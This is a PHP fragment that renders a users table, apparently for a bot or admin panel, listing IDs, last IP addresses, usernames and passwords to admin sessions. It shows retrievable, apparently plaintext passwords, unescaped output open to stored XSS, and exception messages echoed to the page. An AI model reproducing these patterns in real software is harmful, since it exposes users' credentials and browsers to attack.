<?php
	try
	{
		$select = $conn->prepare("SELECT * FROM users");
		$select->execute();

		$BOTTABLE = '<table id="BotTable">';
		$BOTTABLE .= '<tr>';
		$BOTTABLE .= '<th>ID</th>';
		$BOTTABLE .= '<th>Admin</th>';
		$BOTTABLE .= '<th>Last Seen (Seconds ago)</th>';
		$BOTTABLE .= '<th>Last IP</th>';
		$BOTTABLE .= '<th>Username</th>';
		$BOTTABLE .= '<th>Password</th>';
		$BOTTABLE .=  '</tr>';

		while ($row = $select->fetch(PDO::FETCH_ASSOC))
		{
			$BOTTABLE .= '<tr>';
			$BOTTABLE .= '<td>' . $row['id'] . '</td>';
			$BOTTABLE .= '<td>' . $row['admin'] . '</td>';
			$BOTTABLE .= '<td>' . ($TIME - $row['lastseen']) . '</td>';
			if ($_SESSION['admin'] == 1)
				$BOTTABLE .= '<td>' . $row['lastip'] . '</td>';
			else
				$BOTTABLE .= '<td>Permission Denied</td>';
			$BOTTABLE .= '<td>' . $row['username'] . '</td>';
			if ($_SESSION['admin'] == 1)
				$BOTTABLE .= '<td>' . $row['password'] . '</td>';
			else
				$BOTTABLE .= '<td>Permission Denied</td>';
			$BOTTABLE .= '</tr>';
		}

		$BOTTABLE .= "</table>";
		echo $BOTTABLE;
	}
	catch (Exception $e)
	{
		echo 'Caught exception: ',  $e->getMessage(), "\n";
	}
?>
